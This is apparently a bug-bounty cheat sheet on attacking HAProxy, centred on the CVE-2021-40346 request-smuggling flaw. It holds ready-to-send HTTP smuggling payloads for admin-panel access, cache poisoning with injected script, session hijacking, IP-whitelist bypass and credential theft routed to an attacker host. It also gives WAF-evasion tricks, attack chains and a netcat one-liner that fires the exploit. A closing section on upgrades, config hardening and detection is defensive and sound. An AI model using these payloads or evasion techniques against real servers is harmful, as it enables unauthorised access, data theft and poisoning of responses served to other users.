## 1. Overview

**HAProxy** (High Availability Proxy) is a fast, reliable load balancer and reverse proxy for TCP and HTTP applications. Common in enterprise environments to distribute traffic across backend servers.

**Key Security Risks:**

- **HTTP Request Smuggling** → Bypass security controls, poison caches, access admin endpoints
- **Header parsing bugs** → Exploit inconsistencies between HAProxy and backend servers
- **Integer overflow vulnerabilities** → Craft malicious headers that cause unexpected behavior

---

## 2. Detection Methods

### How to Identify HAProxy

**Response Headers:**

```bash
curl -I https://target.com
# Look for:
# Server: HAProxy
# Via: HAProxy
```

**Timing Analysis:**

```bash
# HAProxy has specific timeout behaviors
time curl https://target.com
```

**Error Pages:**

- Default HAProxy error pages have distinctive formatting
- Look for "503 Service Unavailable" with HAProxy styling

**Shodan/Censys:**

```
"HAProxy" port:80,443
```

---

## 3. Exploitation Methods

### 3.1 CVE-2021-40346 (HTTP Request Smuggling)

**Vulnerability:** Integer overflow in Content-Length header parsing  
**Affected Versions:** HAProxy < 2.0.25, < 2.2.17, < 2.3.14, < 2.4.4  
**Impact:** Bypass security controls, access restricted endpoints, cache poisoning

#### How It Works:

HAProxy fails to properly validate extremely long header names, causing an integer overflow. This desynchronizes HAProxy's interpretation vs the backend server's interpretation of where one request ends and another begins.

#### Exploitation Steps:

**Step 1: Craft Malicious Request**

```http
POST /index.html HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60

GET /admin/add_user.py HTTP/1.1
Host: target.com
abc: xyz
```

**Step 2: What Happens:**

- HAProxy sees: One POST request
- Backend sees: POST request + smuggled GET to `/admin/add_user.py`

**Step 3: Verify Success**

```bash
# Check if smuggled request executed
curl -X POST https://target.com/index.html \
  -H "Content-Length0aaa[...repeat 'a' ~200 times...]:" \
  -H "Content-Length: 60" \
  -d "GET /admin/secret HTTP/1.1
Host: target.com
X: Y"
```

---

### 3.2 Generic Request Smuggling Testing

#### CL.TE (Content-Length vs Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

#### TE.CL (Transfer-Encoding vs Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com
X: X
0


```

---

## 4. Payloads

### Top 10 HAProxy Request Smuggling Payloads

#### 1. CVE-2021-40346 Admin Access

```http
POST /index.html HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 55

GET /admin HTTP/1.1
Host: target.com
Foo: bar
```

#### 2. Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 90

GET / HTTP/1.1
Host: target.com
X-Forwarded-For: <script>alert(1)</script>
Foo: bar
```

#### 3. Session Hijacking

```http
POST /login HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 85

GET /account HTTP/1.1
Host: target.com
Cookie: stolen_session
Connection: close
```

#### 4. Bypass IP Whitelisting

```http
POST / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 70

GET /internal-api HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

#### 5. Credential Theft

```http
POST / HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 120

POST /login HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

username=victim&password=
```

#### 6. TE.CL Variant

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

60
GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
0


```

#### 7. Double Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

#### 8. Obfuscated Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: identity

5c
GET /admin HTTP/1.1
Host: target.com
X: X
0


```

#### 9. Header Injection via Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 100

GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
Foo: bar
```

#### 10. Request Queue Poisoning

```http
POST / HTTP/1.1
Host: target.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 150

GET / HTTP/1.1
Host: target.com

GET /404 HTTP/1.1
Host: target.com
Content-Length: 10

x=malicious
```

---

## 5. Higher Impact Scenarios

### 🎯 Scenario 1: Admin Panel Access

**Chain:**

1. Detect HAProxy with vulnerable version
2. Smuggle request to `/admin` or `/api/admin`
3. Bypass authentication checks
4. Access admin functionality → **Critical**

### 🎯 Scenario 2: Web Cache Poisoning

**Chain:**

1. Smuggle malicious headers (XSS payload in X-Forwarded-For)
2. Poison HAProxy or CDN cache
3. All users receive poisoned response → **High/Critical**

### 🎯 Scenario 3: Payment Flow Manipulation

**Chain:**

1. Smuggle request during checkout process
2. Alter `amount`, `user_id`, or `item_id` parameters
3. Complete purchase at manipulated price → **Critical**

### 🎯 Scenario 4: Multi-User Session Hijacking

**Chain:**

1. Smuggle requests in high-traffic endpoint
2. Poison connection pool/queue
3. User A's credentials sent to User B's session → **Critical**

### 🎯 Scenario 5: API Rate Limit Bypass

**Chain:**

1. Smuggle multiple API requests in one
2. Backend processes all smuggled requests
3. Bypass rate limiting → brute force, enumerate → **Medium/High**

---

## 6. Bypasses

### Bypass WAF Detection

**Technique 1: Vary the Padding Length**

```http
Content-Length0aaaaaaa[...]:  # Short padding
Content-Length0aaa[...250 a's...]aaa:  # Long padding
```

**Technique 2: Mix Case in Headers**

```http
content-length0aaa[...]:
CONTENT-LENGTH: 60
```

**Technique 3: Use Tab Instead of Space**

```http
Content-Length0aaa[...]:\t
Content-Length:\t60
```

**Technique 4: Add Null Bytes**

```http
Content-Length\x000aaa[...]:
```

---

## 7. Mitigations

### ✅ For Security Teams

**Immediate:**

- **Upgrade HAProxy** to latest stable version (2.4.4+, 2.3.14+, 2.2.17+, or 2.0.25+)
- **Enable strict HTTP parsing** in HAProxy config:
    
    ```
    option http-strict-versionoption http-ignore-probes
    ```
    

**Configuration Hardening:**

```haproxy
# haproxy.cfg
global
    tune.http.maxhdr 100        # Limit headers
    
defaults
    option httpclose            # Prevent connection reuse
    option http-server-close    # Close backend connections
    option forwardfor           # Log real client IP
    
frontend http-in
    http-request deny if { req.hdr_cnt(content-length) gt 1 }  # Block multiple CL
    http-request deny if { req.hdr_cnt(transfer-encoding) gt 1 }
```

**Detection:**

- **Monitor logs** for abnormal Content-Length values
- **Alert on** requests with extremely long header names
- **IDS rules** for CVE-2021-40346 patterns

### ✅ For Developers

- Normalize request handling between HAProxy and backend
- Reject ambiguous requests (multiple CL headers, mixed TE/CL)
- Use same HTTP parser version across infrastructure
- Implement request validation at application layer

---

## Quick Testing Commands

```bash
# Test for CVE-2021-40346
python3 -c 'print("POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length0" + "a"*200 + ":\r\nContent-Length: 60\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\nX: x")' | nc target.com 80

# Burp Suite: Send to Repeater, manually craft payload

# Automated scanning
nuclei -u https://target.com -t cves/2021/CVE-2021-40346.yaml
```

---

## 🔥 Pro Tips

✅ **Always test on staging first** — Request smuggling can break production  
✅ **Monitor responses carefully** — Look for 2 responses in 1 connection  
✅ **Chain with other bugs** — Smuggling + XSS + Cache = devastating  
✅ **Test timing** — Delayed responses indicate successful smuggling  
✅ **Use Burp Turbo Intruder** — Automate smuggling payload variations  
✅ **Check version** — `curl -I` often reveals HAProxy version in headers

**Reference:** [JFrog Research - CVE-2021-40346](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)